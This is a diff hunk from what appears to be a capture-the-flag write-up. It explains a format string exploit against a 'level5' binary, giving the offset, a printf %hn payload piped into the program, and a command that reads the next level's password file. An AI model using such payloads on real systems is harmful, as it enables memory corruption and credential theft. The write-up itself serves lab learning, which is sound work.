@@ -125,7 +125,7 @@ if we convert those two bytes from hex to decimal with the help of [hex-to-int](
 AAAA 200 b7fd1ac0 b7ff37d0 41414141 20782520
 ```
 So here we see can our __offset__ is again at position 4th and with the `%h` for the *short* it will be `%4\$hn` so far we have all we need to create our *format string exploit:* <br>
-`(python -c "print('\x38\x98\x04\x08' + '%33952d%4\$hn')"; cat -) | ./level5` <br>
+`(python -c "print('\x38\x98\x04\x08' + '%33952d%4\$hn')"; cat) | ./level5` <br>
 Now all we need to do is get the token:
 ```
 cat /home/user/level6/.pass
